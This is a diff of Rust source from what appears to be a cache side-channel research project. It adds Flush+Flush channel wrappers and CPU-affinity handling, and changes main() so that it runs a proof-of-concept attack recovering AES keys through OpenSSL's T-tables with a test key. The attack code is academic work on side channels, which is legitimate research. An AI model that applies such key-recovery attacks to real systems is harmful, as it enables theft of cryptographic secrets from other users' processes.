@@ -23,7 +23,8 @@ use cache_utils::complex_addressing::CacheSlicing;
 use core::fmt;
 use nix::sched::{sched_getaffinity, sched_setaffinity, CpuSet};
 use nix::unistd::Pid;
-use std::fmt::{Debug, Formatter}; // TODO
+use std::fmt::{Debug, Formatter};
+use std::i8::MAX; // TODO
 
 #[derive(Debug)]
 struct Threshold {
@@ -42,6 +43,37 @@ struct FlushAndFlush {
     thresholds: HashMap<VPN, HashMap<Slice, Threshold>>,
     addresses_ready: HashSet<*const u8>,
     slicing: CacheSlicing,
+    original_affinities: CpuSet,
+}
+
+#[derive(Debug)]
+struct SingleFlushAndFlush(FlushAndFlush);
+
+impl SingleFlushAndFlush {
+    pub fn new() -> Option<Self> {
+        FlushAndFlush::new().map(|ff| SingleFlushAndFlush(ff))
+    }
+}
+
+impl SingleAddrCacheSideChannel for SingleFlushAndFlush {
+    unsafe fn test_single(&mut self, addr: *const u8) -> Result<CacheStatus, SideChannelError> {
+        unsafe { self.0.test_single(addr) }
+    }
+
+    unsafe fn prepare_single(&mut self, addr: *const u8) -> Result<(), SideChannelError> {
+        unsafe { self.0.prepare_single(addr) }
+    }
+
+    fn victim_single(&mut self, operation: &dyn Fn()) {
+        self.0.victim_single(operation)
+    }
+
+    unsafe fn calibrate_single(
+        &mut self,
+        addresses: impl IntoIterator<Item = *const u8> + Clone,
+    ) -> Result<(), ChannelFatalError> {
+        unsafe { self.0.calibrate_single(addresses) }
+    }
 }
 
 // Current issue : hash function trips borrow checker.
@@ -54,10 +86,13 @@ impl FlushAndFlush {
                 return None;
             }
 
+            let old = sched_getaffinity(Pid::from_raw(0)).unwrap();
+
             let ret = Self {
                 thresholds: Default::default(),
                 addresses_ready: Default::default(),
                 slicing,
+                original_affinities: old,
             };
             Some(ret)
         } else {
@@ -67,6 +102,12 @@ impl FlushAndFlush {
 
     fn get_slice(&self, addr: *const u8) -> Slice {
         self.slicing.hash(addr as usize).unwrap()
+    }
+}
+
+impl Drop for FlushAndFlush {
+    fn drop(&mut self) {
+        sched_setaffinity(Pid::from_raw(0), &self.original_affinities).unwrap();
     }
 }
 
@@ -99,51 +140,69 @@ fn cum_sum(vector: &[u32]) -> Vec<u32> {
 }
 
 impl MultipleAddrCacheSideChannel for FlushAndFlush {
-    unsafe fn test(
-        &mut self,
-        addresses: impl IntoIterator<Item = *const u8> + Clone,
+    const MAX_ADDR: u32 = 3;
+
+    unsafe fn test<'a, 'b, 'c>(
+        &'a mut self,
+        addresses: &'b mut (impl Iterator<Item = &'c *const u8> + Clone),
     ) -> Result<Vec<(*const u8, CacheStatus)>, SideChannelError> {
         let mut result = Vec::new();
         let mut tmp = Vec::new();
+        let mut i = 0;
         for addr in addresses {
-            let t = unsafe { only_flush(addr) };
+            i += 1;
+            let t = unsafe { only_flush(*addr) };
             tmp.push((addr, t));
+            if i == Self::MAX_ADDR {
+                break;
+            }
         }
         for (addr, time) in tmp {
             if !self.addresses_ready.contains(&addr) {
-                return Err(AddressNotReady(addr));
+                return Err(AddressNotReady(*addr));
             }
-            let vpn: VPN = (addr as usize) & (!0xfff); // FIXME
-            let slice = self.get_slice(addr);
+            let vpn: VPN = (*addr as usize) & (!0xfff); // FIXME
+            let slice = self.get_slice(*addr);
             let threshold = &self.thresholds[&vpn][&slice];
             // refactor this into a struct threshold method ?
             if threshold.is_hit(time) {
-                result.push((addr, CacheStatus::Hit))
+                result.push((*addr, CacheStatus::Hit))
             } else {
-                result.push((addr, CacheStatus::Miss))
+                result.push((*addr, CacheStatus::Miss))
             }
         }
         Ok(result)
     }
 
-    unsafe fn prepare(
-        &mut self,
-        addresses: impl IntoIterator<Item = *const u8> + Clone,
+    unsafe fn prepare<'a, 'b, 'c>(
+        &'a mut self,
+        addresses: &'b mut (impl Iterator<Item = &'c *const u8> + Clone),
     ) -> Result<(), SideChannelError> {
         use core::arch::x86_64 as arch_x86;
-        for addr in addresses.clone() {
-            let vpn: VPN = get_vpn(addr);
-            let slice = self.get_slice(addr);
+        let mut i = 0;
+        let addresses_cloned = addresses.clone();
+        for addr in addresses_cloned {
+            i += 1;
+            let vpn: VPN = get_vpn(*addr);
+            let slice = self.get_slice(*addr);
             if self.addresses_ready.contains(&addr) {
                 continue;
             }
             if !self.thresholds.contains_key(&vpn) || !self.thresholds[&vpn].contains_key(&slice) {
-                return Err(AddressNotCalibrated(addr));
+                return Err(AddressNotCalibrated(*addr));
+            }
+            if i == Self::MAX_ADDR {
+                break;
             }
         }
+        i = 0;
         for addr in addresses {
-            unsafe { flush(addr) };
-            self.addresses_ready.insert(addr);
+            i += 1;
+            unsafe { flush(*addr) };
+            self.addresses_ready.insert(*addr);
+            if i == Self::MAX_ADDR {
+                break;
+            }
         }
         unsafe { arch_x86::_mm_mfence() };
         Ok(())
@@ -383,6 +442,11 @@ impl MultipleAddrCacheSideChannel for FlushAndFlush {
     }
 }
 
+const KEY2: [u8; 32] = [
+    0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc,
+    0x4f, 0x6e, 0x9c, 0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80,
+];
+
 fn main() {
     let open_sslpath = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");
     let mut side_channel = NaiveFlushAndReload::from_threshold(220);
@@ -390,36 +454,50 @@ fn main() {
         attack_t_tables_poc(
             &mut side_channel,
             AESTTableParams {
-                num_encryptions: 1 << 14,
+                num_encryptions: 1 << 12,
                 key: [0; 32],
                 te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
                 openssl_path: &open_sslpath,
             },
         )
     }; /**/
-    let mut side_channel_ff = FlushAndFlush::new().unwrap();
     unsafe {
         attack_t_tables_poc(
-            &mut side_channel_ff,
+            &mut side_channel,
             AESTTableParams {
-                num_encryptions: 1 << 15,
-                key: [0; 32],
+                num_encryptions: 1 << 12,
+                key: KEY2,
                 te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
                 openssl_path: &open_sslpath,
             },
         )
     };
-    /*
-    let mut side_channel_ff = SingleFlushAndFlush::new().unwrap();
-    unsafe {
-        attack_t_tables_poc(
-            &mut side_channel_ff,
-            AESTTableParams {
-                num_encryptions: 1 << 15,
-                key: [0; 32],
-                te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
-                openssl_path: &open_sslpath,
-            },
-        )
-    };*/
+    {
+        let mut side_channel_ff = FlushAndFlush::new().unwrap();
+        unsafe {
+            attack_t_tables_poc(
+                &mut side_channel_ff,
+                AESTTableParams {
+                    num_encryptions: 1 << 12,
+                    key: [0; 32],
+                    te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+                    openssl_path: &open_sslpath,
+                },
+            )
+        };
+    }
+    {
+        let mut side_channel_ff = SingleFlushAndFlush::new().unwrap();
+        unsafe {
+            attack_t_tables_poc(
+                &mut side_channel_ff,
+                AESTTableParams {
+                    num_encryptions: 1 << 12,
+                    key: KEY2,
+                    te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+                    openssl_path: &open_sslpath,
+                },
+            )
+        };
+    }
 }
